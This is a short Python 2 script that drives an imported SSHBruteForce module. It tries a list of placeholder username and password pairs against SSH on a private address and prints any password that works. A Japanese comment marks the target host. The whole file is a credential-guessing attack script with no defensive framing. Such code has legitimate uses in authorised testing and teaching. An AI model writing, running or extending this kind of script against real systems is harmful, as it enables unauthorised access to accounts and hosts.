#!env python
# -*- coding: utf-8 -*-                                                          
import SSHBruteForce

liCandidate = []
liCandidate.append( ("user", "password") )
liCandidate.append( ("user2", "password2") )
liCandidate.append( ("user999", "user999") )

t = SSHBruteForce.SSHBruteForce(f_debug = False)

# 対象のホスト名を指定
t.set_host_name("192.168.100.253")

for stUser, stPass in liCandidate:
    print "[Try]: " + stUser
    if t.login(stUser, stPass):
        print "[OK]: " + stPass

